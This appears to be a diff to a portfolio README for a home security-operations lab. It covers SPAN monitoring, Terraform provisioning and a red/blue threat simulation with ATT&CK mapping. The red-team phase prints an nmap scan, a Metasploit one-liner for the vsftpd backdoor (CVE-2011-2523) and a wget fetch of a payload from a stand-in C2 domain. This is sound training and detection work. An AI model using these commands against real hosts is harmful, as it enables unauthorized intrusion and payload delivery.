@@ -166,5 +166,220 @@ Blocked Traffic:      VLAN 30/40 ✗→ Production Networks
 The managed switch employs port mirroring (SPAN) to duplicate all traffic from critical network segments (firewall trunk + wireless AP) to a dedicated monitoring port. This port connects to a dedicated network interface on the hypervisor, bypassing the production data path entirely.
 
 **Traffic Flow:**
+Attack Traffic → Firewall → Switch Trunk →
+├─ Production Path: Continue to destination
+└─ SPAN Copy: → Monitor Port → NSM Sensor (Promiscuous Mode)
+
+**Key Benefits:**
+
+- **Complete Visibility:** Full-duplex packet capture of all inter-zone traffic
+- **Zero Performance Impact:** Monitoring does not introduce latency in production path
+- **Stealth Operation:** NSM sensor has no IP address on sniffing interface
+- **Protocol Fidelity:** Captures Layer 2-7 without decryption or modification
+
+---
+
+### 3. Infrastructure as Code – Terraform-Driven SOC Deployment
+
+**Automation Benefits:**
+
+All virtual infrastructure is provisioned using Terraform with a hypervisor-specific provider, ensuring:
+
+- **Configuration Consistency:** Compute resources, storage layout, and network topology defined as code
+- **Drift Detection:** `terraform plan` detects manual configuration changes
+- **Rapid Deployment:** Complete environment rebuild in under 10 minutes
+- **Version Control:** Infrastructure changes tracked via Git with full audit trail
+
+**Example Infrastructure Code Pattern:**
+
+```hcl
+resource "hypervisor_vm" "nsm_sensor" {
+  name      = "soc-sensor"
+  node_name = var.hypervisor_node
+
+  cpu { cores = 4; type = "host" }
+  memory { dedicated = 16384 }
+
+  # Dual-disk configuration
+  disk { size = 200 }  # Operating system
+  disk { size = 100 }  # PCAP/log storage
+
+  # Dual-NIC configuration
+  network_device { vlan_id = 10 }  # Management
+  network_device { }               # Promiscuous sniffing (no IP)
+}
+```
+
+---
+
+## Lab Execution Guide: End-to-End Threat Simulation
+
+### Phase 1 – Attack Execution (Red Team)
+
+**Objective:** Execute a controlled exploit against a vulnerable target, generating full packet captures for blue team analysis.
+
+**Step 1: Verify Network Isolation**
+
+```bash
+# From attack platform
+ping <victim_target>       # Should succeed (attack path permitted)
+ping <soc_sensor>          # Should timeout (blocked by firewall)
+ping <production_gateway>  # Should timeout (blocked by firewall)
+```
+
+**Step 2: Reconnaissance**
+
+```bash
+nmap -sS -p 21,22,23,80,443 --reason <victim_target>
+```
+
+Expected: Vulnerable services exposed (FTP, Telnet, HTTP)
+
+**Step 3: Exploitation**
+
+```bash
+# Example: vsftpd backdoor (CVE-2011-2523)
+msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <target>; run"
+```
+
+**Step 4: Post-Exploitation**
+
+Generate detectable command execution and C2 traffic:
+
+```bash
+whoami
+uname -a
+wget http://simulated-c2-domain.test/payload
+```
+
+---
+
+### Phase 2 – Network Detection (Blue Team)
+
+**1. Verify Packet Capture**
+
+```bash
+# On NSM sensor
+sudo tcpdump -i <sniffing_interface> -c 100 host <victim_ip>
+```
+
+Confirm: SYN/ACK handshakes, application-layer payloads visible
+
+**2. Alert Triage**
+
+NSM Dashboard → Alerts → Filter by source IP
+
+Expected Detections:
+- Network reconnaissance signatures
+- Exploitation attempt indicators
+- Post-compromise C2 beaconing
+
+**3. Protocol Analysis**
+
+Query connection logs for full session metadata:
+- Connection states
+- Byte counts
+- Service banners
+- Certificate fingerprints
+
+**4. PCAP Forensics**
+
+Download full packet capture for offline analysis in Wireshark or NetworkMiner.
+
+---
+
+### Phase 3 – Incident Response
+
+**MITRE ATT&CK Mapping:**
+
+| Tactic | Technique | Evidence |
+|--------|-----------|----------|
+| Reconnaissance | T1046 | Port scan signatures |
+| Initial Access | T1210 | Remote service exploitation |
+| Execution | T1059 | Shell command execution |
+| C2 | T1071 | Application layer protocol |
+
+**Incident Documentation Template:**
+
+```markdown
+## Attack Summary
+- **Threat Actor:** Simulated APT
+- **Entry Vector:** [Specific CVE]
+- **Target Asset:** Vulnerable VM (VLAN 40)
+- **Detection Method:** SPAN → NSM correlation
+- **Containment Status:** Isolated to victim network
+- **Remediation:** Patching recommendations, rule tuning
+```
+
+---
+
+## Deployment Notes & Troubleshooting
+
+### 1. Hypervisor VLAN Configuration
+
+**Issue:** VMs cannot reach gateway after VLAN implementation
+
+**Resolution:** Enable VLAN awareness on virtual bridge and configure allowed VLAN list in bridge configuration file. Restart networking service and VMs.
+
+### 2. Firewall Object Definitions
+
+**Issue:** Rules not matching expected traffic
+
+**Resolution:** Ensure network objects reference entire subnets (CIDR notation) rather than individual host addresses (/32).
+
+### 3. Layer 2 Connectivity
+
+**Issue:** ARP resolution failures
+
+**Resolution:** Verify bridge VLAN database includes VM's VLAN tag on corresponding tap interface. Restart VM to regenerate interface mappings.
+
+### 4. Stateful Firewall Considerations
+
+**Issue:** Unidirectional traffic failures
+
+**Resolution:** Add explicit return-path rules for non-stateful scenarios (lab bidirectional attack traffic).
+
+### 5. Emergency Isolation
+
+A disabled-by-default firewall rule serves as a kill switch: enabling it instantly severs all SOC/lab connectivity without impacting production operations. Uses "Reject" action for immediate connection failures rather than silent drops.
+
+---
+
+## Skills Demonstrated
+
+| Competency | Implementation |
+|------------|----------------|
+| Defense Architecture | Multi-zone segmentation, zero-trust design |
+| Network Security Monitoring | Out-of-band SPAN topology, sensor deployment |
+| Infrastructure Automation | Full IaC provisioning with drift detection |
+| Offensive Security | Controlled exploitation, post-compromise simulation |
+| Incident Response | Alert triage, forensic analysis, ATT&CK mapping |
+| Systems Engineering | Virtualization, bridge networking, packet capture |
+
+---
+
+## Future Roadmap
+
+- Threat intelligence feed integration (STIX/TAXII)
+- Centralized SIEM with multi-source log correlation
+- SOAR platform for automated response workflows
+- Purple team continuous validation framework
+- Hybrid cloud sensor deployment with secure backhaul
+
+---
+
+## Contact
+
+This project demonstrates hands-on competency in detection engineering, defensive architecture, and security automation.
+
+- **GitHub:** `[Your GitHub Username]`
+- **LinkedIn:** `[Your LinkedIn Profile]`
+- **Portfolio:** `[Your Website]`
+
+---
+
+**Documentation Version:** 1.0  
+**Last Updated:** Q2 2026  
+**Technology Stack:** Modern NSM Platform | Enterprise Hypervisor | IaC Tooling
 
 
